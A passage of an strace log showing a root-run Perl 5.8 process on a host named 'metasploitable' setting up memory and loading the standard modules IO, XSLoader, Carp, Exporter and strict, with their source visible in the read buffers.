\4\0\0\0\0\0\0\0\0\0\0\0\0\0\0\22\0\0\0\23\0\0\0\24\0\0\0\0\0\0\0\25\0\0\0\26\0\0\0\0\0\0\0\27\0\0\0\0\0\0\0\30\0\0\0\31\0\0\0\0\0\0\0k\31Qj\233(\375B\233`\205\33\327\16?\17I->\333\235C\r\375\313\373_\22\325=l\366\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0o\0\0\0\0\0\0\0\35\0\0\0\22\0\0\0\1\0\0\0\0\0\0\0\0\0\0\0 \0\0\0\37\0\0\0\0\0\0\0", 512) = 512
10104 20:03:03.108336 fstat64(1, {st_mode=S_IFREG|0644, st_size=38300, ...}) = 0
10104 20:03:03.108385 mmap2(NULL, 201052, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 1, 0) = 0xb7dc7000
10104 20:03:03.108403 mmap2(0xb7dd0000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 1, 0x8) = 0xb7dd0000
10104 20:03:03.108432 mmap2(0xb7dd2000, 155996, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xb7dd2000
10104 20:03:03.108447 close(1)          = 0
10104 20:03:03.108471 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7dc6000
10104 20:03:03.108484 set_thread_area({entry_number:-1 -> 6, base_addr:0xb7dc68c0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
10104 20:03:03.108550 mprotect(0xb7f42000, 4096, PROT_READ) = 0
10104 20:03:03.108579 munmap(0xb7f8a000, 29913) = 0
10104 20:03:03.108592 set_tid_address(0xb7dc6908) = 10104
10104 20:03:03.108602 set_robust_list(0xb7dc6910, 0xc) = 0
10104 20:03:03.108611 futex(0xbfa44ee0, 0x81 /* FUTEX_??? */, 1) = 0
10104 20:03:03.108627 rt_sigaction(SIGRTMIN, {0xb7f4c2c0, [], SA_SIGINFO}, NULL, 8) = 0
10104 20:03:03.108640 rt_sigaction(SIGRT_1, {0xb7f4c340, [], SA_RESTART|SA_SIGINFO}, NULL, 8) = 0
10104 20:03:03.108653 rt_sigprocmask(SIG_UNBLOCK, [RTMIN RT_1], NULL, 8) = 0
10104 20:03:03.108667 getrlimit(RLIMIT_STACK, {rlim_cur=8192*1024, rlim_max=RLIM_INFINITY}) = 0
10104 20:03:03.108688 uname({sys="Linux", node="metasploitable", ...}) = 0
10104 20:03:03.108740 rt_sigaction(SIGFPE, {SIG_IGN}, {SIG_DFL}, 8) = 0
10104 20:03:03.108788 brk(0)            = 0x8153000
10104 20:03:03.108798 brk(0x8174000)    = 0x8174000
10104 20:03:03.108893 getuid32()        = 0
10104 20:03:03.108922 geteuid32()       = 0
10104 20:03:03.108932 getgid32()        = 0
10104 20:03:03.108941 getegid32()       = 0
10104 20:03:03.108996 mmap2(NULL, 135168, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7da5000
10104 20:03:03.109027 open("/dev/urandom", O_RDONLY|O_LARGEFILE) = 1
10104 20:03:03.109046 read(1, ">\263\320z", 4) = 4
10104 20:03:03.109060 close(1)          = 0
10104 20:03:03.109080 time(NULL)        = 1495670583
10104 20:03:03.109126 stat64("/usr/local/lib/site_perl/5.8.8/i486-linux-gnu-thread-multi", 0xbfa44bb0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109151 stat64("/usr/local/lib/site_perl/5.8.8", 0xbfa44bb0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109165 stat64("/usr/local/lib/site_perl/i486-linux-gnu-thread-multi", 0xbfa44bb0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109181 stat64("/usr/local/lib/perl/5.8.7", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109194 stat64("/usr/local/share/perl/5.8.7", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109207 stat64("/usr/local/lib/perl/5.8.6", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109218 stat64("/usr/local/share/perl/5.8.6", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109231 stat64("/usr/local/lib/perl/5.8.4", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109242 stat64("/usr/local/share/perl/5.8.4", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109254 stat64("/usr/local/lib/perl/5.8.3", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109279 stat64("/usr/local/share/perl/5.8.3", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109291 stat64("/usr/local/lib/perl/5.8.2", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109303 stat64("/usr/local/share/perl/5.8.2", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109315 stat64("/usr/local/lib/perl/5.8.1", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109327 stat64("/usr/local/share/perl/5.8.1", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109339 stat64("/usr/local/lib/perl/5.8.0", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109383 stat64("/usr/local/share/perl/5.8.0", 0xbfa44cf0) = -1 ENOENT (No such file or directory)
10104 20:03:03.109409 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa449e8) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.109437 _llseek(0, 0, [0], SEEK_CUR) = 0
10104 20:03:03.109450 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa449e8) = -1 EBADF (Bad file descriptor)
10104 20:03:03.109461 _llseek(1, 0, 0xbfa44a30, SEEK_CUR) = -1 EBADF (Bad file descriptor)
10104 20:03:03.109472 ioctl(2, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa449e8) = -1 EINVAL (Invalid argument)
10104 20:03:03.109486 _llseek(2, 0, 0xbfa44a30, SEEK_CUR) = -1 ESPIPE (Illegal seek)
10104 20:03:03.109497 open("/dev/null", O_RDONLY|O_LARGEFILE) = 1
10104 20:03:03.109511 ioctl(1, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44aa8) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.109521 _llseek(1, 0, [0], SEEK_CUR) = 0
10104 20:03:03.109533 fcntl64(1, F_SETFD, FD_CLOEXEC) = 0
10104 20:03:03.109545 fstat64(1, {st_mode=S_IFCHR|0666, st_rdev=makedev(1, 3), ...}) = 0
10104 20:03:03.109564 rt_sigaction(SIGCHLD, NULL, {SIG_DFL}, 8) = 0
10104 20:03:03.109624 readlink("/proc/self/exe", "/usr/bin/perl", 4095) = 13
10104 20:03:03.109672 getppid()         = 10102
10104 20:03:03.109735 stat64("/etc/perl/IO.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.109750 stat64("/etc/perl/IO.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.109763 stat64("/usr/local/lib/perl/5.8.8/IO.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.109776 stat64("/usr/local/lib/perl/5.8.8/IO.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.109790 stat64("/usr/local/share/perl/5.8.8/IO.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.109802 stat64("/usr/local/share/perl/5.8.8/IO.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.109816 stat64("/usr/lib/perl5/IO.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.109828 stat64("/usr/lib/perl5/IO.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.109842 stat64("/usr/share/perl5/IO.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.110208 stat64("/usr/share/perl5/IO.pm", 0xbfa446ac) = -1 ENOENT (No such file or directory)
10104 20:03:03.110282 stat64("/usr/lib/perl/5.8/IO.pmc", 0xbfa4479c) = -1 ENOENT (No such file or directory)
10104 20:03:03.110327 stat64("/usr/lib/perl/5.8/IO.pm", {st_mode=S_IFREG|0644, st_size=413, ...}) = 0
10104 20:03:03.110363 open("/usr/lib/perl/5.8/IO.pm", O_RDONLY|O_LARGEFILE) = 6
10104 20:03:03.110388 ioctl(6, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa444b8) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.110400 _llseek(6, 0, [0], SEEK_CUR) = 0
10104 20:03:03.110427 read(6, "#\n\npackage IO;\n\nuse XSLoader ();\nuse Carp;\nuse strict;\nuse warnings;\n\nour $VERSION = \"1.22\";\nXSLoader::load \'IO\', $VERSION;\n\nsub import {\n    shift;\n\n    warnings::warnif(\'deprecated\', qq{Parameterless \"use IO\" deprecated})\n        if @_ == 0 ;\n    \n    my @l = @_ ? @_ : qw(Handle Seekable File Pipe Socket Dir);\n\n    eval join(\"\", map { \"require IO::\" . (/(\\w+)/)[0] . \";\\n\" } @l)\n\tor croak $@;\n}\n\n1;\n\n__END__\n\n", 4096) = 413
10104 20:03:03.110484 stat64("/etc/perl/XSLoader.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.110498 stat64("/etc/perl/XSLoader.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.110512 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.110525 stat64("/usr/local/lib/perl/5.8.8/XSLoader.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.110539 stat64("/usr/local/share/perl/5.8.8/XSLoader.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.110552 stat64("/usr/local/share/perl/5.8.8/XSLoader.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.110566 stat64("/usr/lib/perl5/XSLoader.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.110591 stat64("/usr/lib/perl5/XSLoader.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.110605 stat64("/usr/share/perl5/XSLoader.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.110617 stat64("/usr/share/perl5/XSLoader.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.110631 stat64("/usr/lib/perl/5.8/XSLoader.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.110644 stat64("/usr/lib/perl/5.8/XSLoader.pm", {st_mode=S_IFREG|0644, st_size=3408, ...}) = 0
10104 20:03:03.110675 open("/usr/lib/perl/5.8/XSLoader.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:03.110718 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.110729 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:03.110769 read(8, "# Generated from XSLoader.pm.PL (resolved %Config::Config value)\n\npackage XSLoader;\n\n$VERSION = \"0.06\";\n\n#use strict;\n\n# enable debug/trace messages from DynaLoader perl code\n# $dl_debug = $ENV{PERL_DL_DEBUG} || 0 unless defined $dl_debug;\n\n  my $dl_dlext = \'so\';\n\npackage DynaLoader;\n\n# No prizes for guessing why we don\'t say \'bootstrap DynaLoader;\' here.\n# NOTE: All dl_*.xs (including dl_none.xs) define a dl_error() XSUB\nboot_DynaLoader(\'DynaLoader\') if defined(&boot_DynaLoader) &&\n                                !defined(&dl_error);\npackage XSLoader;\n\nsub load {\n    package DynaLoader;\n\n    die q{XSLoader::load(\'Your::Module\', $Your::Module::VERSION)} unless @_;\n\n    my($module) = $_[0];\n\n    # work with static linking too\n    my $b = \"$module\\::bootstrap\";\n    goto &$b if defined &$b;\n\n    goto retry unless $module and defined &dl_load_file;\n\n    my @modparts = split(/::/,$module);\n    my $modfname = $modparts[-1];\n\n    my $modpname = join(\'/\',@modparts);\n    my $modlibname = (caller())[1];\n    my $c = @modparts;\n    $modlibname =~ s,[\\\\/][^\\\\/]+$,, while $c--;\t# Q&D basename\n    my $file = \"$modlibname/auto/$modpname/$modfname.$dl_dlext\";\n\n#   print STDERR \"XSLoader::load for $module ($file)\\n\" if $dl_debug;\n\n    my $bs = $file;\n    $bs =~ s/(\\.\\w+)?(;\\d*)?$/\\.bs/; # look for .bs \'beside\' the library\n\n    goto retry if not -f $file or -s $bs;\n\n    my $bootname = \"boot_$module\";\n    $bootname =~ s/\\W/_/g;\n    @DynaLoader::dl_require_symbols = ($bootname);\n\n    my $boot_symbol_ref;\n\n    if ($^O eq \'darwin\') {\n        if ($boot_symbol_ref = dl_find_symbol(0, $bootname)) {\n            goto boot; #extension library has already been loaded, e.g. darwin\n        }\n    }\n\n    # Many dynamic extension loading problems will appear to come from\n    # this section of code: XYZ failed at line 123 of DynaLoader.pm.\n    # Often these errors are actually occurring in the initialisation\n    # C code of the extension XS file. Perl reports the error as being\n    # in this perl code simply because this was the last perl code\n    # it executed.\n\n    my $libref = dl_load_file($file, 0) or do { \n        require Carp;\n        Carp::croak(\"Can\'t load \'$file\' for module $module: \" . dl_error());\n    };\n    push(@DynaLoader::dl_librefs,$libref);  # record loaded object\n\n    my @unresolved = dl_undef_symbols();\n    if (@unresolved) {\n        require Carp;\n        Carp::carp(\"Undefined symbols present after loading $file: @unresolved\\n\");\n    }\n\n    $boot_symbol_ref = dl_find_symbol($libref, $bootname) or do {\n        require Carp;\n        Carp::croak(\"Can\'t find \'$bootname\' symbol in $file\\n\");\n    };\n\n    push(@DynaLoader::dl_modules, $module); # record loaded module\n\n  boot:\n    my $xs = dl_install_xsub(\"${module}::bootstrap\", $boot_symbol_ref, $file);\n\n    # See comment block above\n    return &$xs(@_);\n\n  retry:\n    my $bootstrap_inherit = DynaLoader->can(\'bootstrap_inherit\') || \n                            XSLoader->can(\'bootstrap_inherit\');\n    goto &$bootstrap_inherit;\n}\n\n# Versions of DynaLoader prior to 5.6.0 don\'t have this function.\nsub bootstrap_inherit {\n    package DynaLoader;\n\n    my $module = $_[0];\n    local *DynaLoader::isa = *{\"$module\\::ISA\"};\n    local @DynaLoader::isa = (@DynaLoader::isa, \'DynaLoader\');\n    # Cannot goto due to delocalization.  Will report errors on a wrong line?\n    require DynaLoader;\n    DynaLoader::bootstrap(@_);\n}\n\n1;\n\n__END__\n\n", 4096) = 3408
10104 20:03:03.111009 brk(0x8195000)    = 0x8195000
10104 20:03:03.111385 _llseek(8, 3407, [3407], SEEK_SET) = 0
10104 20:03:03.111419 _llseek(8, 0, [3407], SEEK_CUR) = 0
10104 20:03:03.111430 close(8)          = 0
10104 20:03:03.111480 stat64("/etc/perl/Carp.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.111496 stat64("/etc/perl/Carp.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.111510 stat64("/usr/local/lib/perl/5.8.8/Carp.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.111523 stat64("/usr/local/lib/perl/5.8.8/Carp.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.111537 stat64("/usr/local/share/perl/5.8.8/Carp.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.111550 stat64("/usr/local/share/perl/5.8.8/Carp.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.111564 stat64("/usr/lib/perl5/Carp.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.111576 stat64("/usr/lib/perl5/Carp.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.111589 stat64("/usr/share/perl5/Carp.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.111601 stat64("/usr/share/perl5/Carp.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.111615 stat64("/usr/lib/perl/5.8/Carp.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.111628 stat64("/usr/lib/perl/5.8/Carp.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.111641 stat64("/usr/share/perl/5.8/Carp.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.111666 stat64("/usr/share/perl/5.8/Carp.pm", {st_mode=S_IFREG|0644, st_size=4112, ...}) = 0
10104 20:03:03.111711 open("/usr/share/perl/5.8/Carp.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:03.111742 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.111761 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:03.111779 read(8, "package Carp;\n\nour $VERSION = \'1.04\';\n\n# This package is heavily used. Be small. Be fast. Be good.\n\n# Comments added by Andy Wardley <abw@kfs.org> 09-Apr-98, based on an\n# _almost_ complete understanding of the package.  Corrections and\n# comments are welcome.\n\n# The members of %Internal are packages that are internal to perl.\n# Carp will not report errors from within these packages if it\n# can.  The members of %CarpInternal are internal to Perl\'s warning\n# system.  Carp will not report errors from within these packages\n# either, and will not report calls *to* these packages for carp and\n# croak.  They replace $CarpLevel, which is deprecated.    The\n# $Max(EvalLen|(Arg(Len|Nums)) variables are used to specify how the eval\n# text and function arguments should be formatted when printed.\n\n# Comments added by Jos I. Boumans <kane@dwim.org> 11-Aug-2004\n# I can not get %CarpInternal or %Internal to work as advertised,\n# therefor leaving it out of the below documentation.\n# $CarpLevel may be decprecated according to the last comment, but\n# after 6 years, it\'s still around and in heavy use ;)\n\n$CarpInternal{Carp}++;\n$CarpInternal{warnings}++;\n$CarpLevel = 0;     # How many extra package levels to skip on carp.\n                    # How many calls to skip on confess.\n                    # Reconciling these notions is hard, use\n                    # %Internal and %CarpInternal instead.\n$MaxEvalLen = 0;    # How much eval \'...text...\' to show. 0 = all.\n$MaxArgLen = 64;    # How much of each argument to print. 0 = all.\n$MaxArgNums = 8;    # How many arguments to print. 0 = all.\n$Verbose = 0;       # If true then make shortmess call longmess instead\n\nrequire Exporter;\n@ISA = (\'Exporter\');\n@EXPORT = qw(confess croak carp);\n@EXPORT_OK = qw(cluck verbose longmess shortmess);\n@EXPORT_FAIL = qw(verbose);\t# hook to enable verbose mode\n\n# if the caller specifies verbose usage (\"perl -MCarp=verbose script.pl\")\n# then the following method will be called by the Exporter which knows\n# to do this thanks to @EXPORT_FAIL, above.  $_[1] will contain the word\n# \'verbose\'.\n\nsub export_fail {\n    shift;\n    $Verbose = shift if $_[0] eq \'verbose\';\n    return @_;\n}\n\n# longmess() crawls all the way up the stack reporting on all the function\n# calls made.  The error string, $error, is originally constructed from the\n# arguments passed into longmess() via confess(), cluck() or shortmess().\n# This gets appended with the stack trace messages which are generated for\n# each function call on the stack.\n\nsub longmess {\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    if ($Internal{$call_pack} or $CarpInternal{$call_pack}) {\n      return longmess_heavy(@_);\n    }\n    else {\n      local $CarpLevel = $CarpLevel + 1;\n      return longmess_heavy(@_);\n    }\n}\n\n# shortmess() is called by carp() and croak() to skip all the way up to\n# the top-level caller\'s package and report the error from there.  confess()\n# and cluck() generate a full stack trace so they call longmess() to\n# generate that.  In verbose mode shortmess() calls longmess() so\n# you always get a stack trace\n\nsub shortmess {\t# Short-circuit &longmess if called via multiple packages\n    {\n\tlocal($@, $!);\n\t# XXX fix require to not clear $@ or $!?\n\t# don\'t use require unless we need to (for Safe compartments)\n\trequire Carp::Heavy unless $INC{\"Carp/Heavy.pm\"};\n    }\n    # Icky backwards compatibility wrapper. :-(\n    my $call_pack = caller();\n    local @CARP_NOT = caller();\n    shortmess_heavy(@_);\n}\n\n# the following four functions call longmess() or shortmess() depending on\n# whether they should generate a full stack trace (confess() and cluck())\n# or simply report the caller\'s package (croak() and carp()), respectively.\n# confess() and croak() die, carp() and cluck() warn.\n\nsub croak   { die  shortmess @_ }\nsub confess { die  longmess  @_ }\nsub carp    { warn shortmess @_ }\nsub cluck   { warn lon", 4096) = 4096
10104 20:03:03.112289 read(8, "gmess  @_ }\n\n1;\n", 4096) = 16
10104 20:03:03.112346 read(8, "", 4096) = 0
10104 20:03:03.112358 close(8)          = 0
10104 20:03:03.112380 stat64("/etc/perl/Exporter.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.112395 stat64("/etc/perl/Exporter.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.112409 stat64("/usr/local/lib/perl/5.8.8/Exporter.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.112422 stat64("/usr/local/lib/perl/5.8.8/Exporter.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.112436 stat64("/usr/local/share/perl/5.8.8/Exporter.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.112449 stat64("/usr/local/share/perl/5.8.8/Exporter.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.112463 stat64("/usr/lib/perl5/Exporter.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.112476 stat64("/usr/lib/perl5/Exporter.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.112489 stat64("/usr/share/perl5/Exporter.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.112502 stat64("/usr/share/perl5/Exporter.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.112516 stat64("/usr/lib/perl/5.8/Exporter.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.112529 stat64("/usr/lib/perl/5.8/Exporter.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.112543 stat64("/usr/share/perl/5.8/Exporter.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.112556 stat64("/usr/share/perl/5.8/Exporter.pm", {st_mode=S_IFREG|0644, st_size=2218, ...}) = 0
10104 20:03:03.112577 open("/usr/share/perl/5.8/Exporter.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:03.112592 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.112604 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:03.112621 read(8, "package Exporter;\n\nrequire 5.006;\n\n# Be lean.\n#use strict;\n#no strict \'refs\';\n\nour $Debug = 0;\nour $ExportLevel = 0;\nour $Verbose ||= 0;\nour $VERSION = \'5.58\';\nour (%Cache);\n$Carp::Internal{Exporter} = 1;\n\nsub as_heavy {\n  require Exporter::Heavy;\n  # Unfortunately, this does not work if the caller is aliased as *name = \\&foo\n  # Thus the need to create a lot of identical subroutines\n  my $c = (caller(1))[3];\n  $c =~ s/.*:://;\n  \\&{\"Exporter::Heavy::heavy_$c\"};\n}\n\nsub export {\n  goto &{as_heavy()};\n}\n\nsub import {\n  my $pkg = shift;\n  my $callpkg = caller($ExportLevel);\n\n  if ($pkg eq \"Exporter\" and @_ and $_[0] eq \"import\") {\n    *{$callpkg.\"::import\"} = \\&import;\n    return;\n  }\n\n  # We *need* to treat @{\"$pkg\\::EXPORT_FAIL\"} since Carp uses it :-(\n  my($exports, $fail) = (\\@{\"$pkg\\::EXPORT\"}, \\@{\"$pkg\\::EXPORT_FAIL\"});\n  return export $pkg, $callpkg, @_\n    if $Verbose or $Debug or @$fail > 1;\n  my $export_cache = ($Cache{$pkg} ||= {});\n  my $args = @_ or @_ = @$exports;\n\n  local $_;\n  if ($args and not %$export_cache) {\n    s/^&//, $export_cache->{$_} = 1\n      foreach (@$exports, @{\"$pkg\\::EXPORT_OK\"});\n  }\n  my $heavy;\n  # Try very hard not to use {} and hence have to  enter scope on the foreach\n  # We bomb out of the loop with last as soon as heavy is set.\n  if ($args or $fail) {\n    ($heavy = (/\\W/ or $args and not exists $export_cache->{$_}\n               or @$fail and $_ eq $fail->[0])) and last\n                 foreach (@_);\n  } else {\n    ($heavy = /\\W/) and last\n      foreach (@_);\n  }\n  return export $pkg, $callpkg, ($args ? @_ : ()) if $heavy;\n  local $SIG{__WARN__} = \n\tsub {require Carp; &Carp::carp};\n  # shortcut for the common case of no type character\n  *{\"$callpkg\\::$_\"} = \\&{\"$pkg\\::$_\"} foreach @_;\n}\n\n# Default methods\n\nsub export_fail {\n    my $self = shift;\n    @_;\n}\n\n# Unfortunately, caller(1)[3] \"does not work\" if the caller is aliased as\n# *name = \\&foo.  Thus the need to create a lot of identical subroutines\n# Otherwise we could have aliased them to export().\n\nsub export_to_level {\n  goto &{as_heavy()};\n}\n\nsub export_tags {\n  goto &{as_heavy()};\n}\n\nsub export_ok_tags {\n  goto &{as_heavy()};\n}\n\nsub require_version {\n  goto &{as_heavy()};\n}\n\n1;\n__END__\n\n", 4096) = 2218
10104 20:03:03.113127 _llseek(8, 2217, [2217], SEEK_SET) = 0
10104 20:03:03.113152 _llseek(8, 0, [2217], SEEK_CUR) = 0
10104 20:03:03.113166 close(8)          = 0
10104 20:03:03.113282 stat64("/etc/perl/strict.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113299 stat64("/etc/perl/strict.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.113312 stat64("/usr/local/lib/perl/5.8.8/strict.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113325 stat64("/usr/local/lib/perl/5.8.8/strict.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.113340 stat64("/usr/local/share/perl/5.8.8/strict.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113352 stat64("/usr/local/share/perl/5.8.8/strict.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.113367 stat64("/usr/lib/perl5/strict.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113379 stat64("/usr/lib/perl5/strict.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.113392 stat64("/usr/share/perl5/strict.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113404 stat64("/usr/share/perl5/strict.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.113418 stat64("/usr/lib/perl/5.8/strict.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113431 stat64("/usr/lib/perl/5.8/strict.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.113444 stat64("/usr/share/perl/5.8/strict.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113457 stat64("/usr/share/perl/5.8/strict.pm", {st_mode=S_IFREG|0644, st_size=599, ...}) = 0
10104 20:03:03.113478 open("/usr/share/perl/5.8/strict.pm", O_RDONLY|O_LARGEFILE) = 8
10104 20:03:03.113493 ioctl(8, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfa44008) = -1 ENOTTY (Inappropriate ioctl for device)
10104 20:03:03.113505 _llseek(8, 0, [0], SEEK_CUR) = 0
10104 20:03:03.113525 read(8, "package strict;\n\n$strict::VERSION = \"1.03\";\n\nmy %bitmask = (\nrefs => 0x00000002,\nsubs => 0x00000200,\nvars => 0x00000400\n);\n\nsub bits {\n    my $bits = 0;\n    my @wrong;\n    foreach my $s (@_) {\n\tpush @wrong, $s unless exists $bitmask{$s};\n        $bits |= $bitmask{$s} || 0;\n    }\n    if (@wrong) {\n        require Carp;\n        Carp::croak(\"Unknown \'strict\' tag(s) \'@wrong\'\");\n    }\n    $bits;\n}\n\nmy $default_bits = bits(qw(refs subs vars));\n\nsub import {\n    shift;\n    $^H |= @_ ? bits(@_) : $default_bits;\n}\n\nsub unimport {\n    shift;\n    $^H &= ~ (@_ ? bits(@_) : $default_bits);\n}\n\n1;\n__END__\n\n", 4096) = 599
10104 20:03:03.113705 _llseek(8, 598, [598], SEEK_SET) = 0
10104 20:03:03.113737 _llseek(8, 0, [598], SEEK_CUR) = 0
10104 20:03:03.113748 close(8)          = 0
10104 20:03:03.113787 stat64("/etc/perl/warnings.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113802 stat64("/etc/perl/warnings.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
10104 20:03:03.113817 stat64("/usr/local/lib/perl/5.8.8/warnings.pmc", 0xbfa442ec) = -1 ENOENT (No such file or directory)
10104 20:03:03.113830 stat64("/usr/local/lib/perl/5.8.8/warnings.pm", 0xbfa441fc) = -1 ENOENT (No such file or directory)
